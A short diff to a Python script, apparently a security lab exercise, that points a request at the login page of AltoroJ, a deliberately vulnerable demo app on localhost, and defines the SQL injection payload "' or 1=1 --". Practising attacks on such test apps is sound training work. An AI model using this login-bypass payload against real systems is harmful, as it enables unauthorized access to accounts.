@@ -1,7 +1,7 @@
 import requests
 
 # Define la URL de AltoroJ
-url = "http://localhost:8130/altoroj/algoMas"
+url = "http://localhost:8130/altoroj/login.jsp"
 
 # Payload para Inyeccion SQL
 payload = "' or 1=1 --"
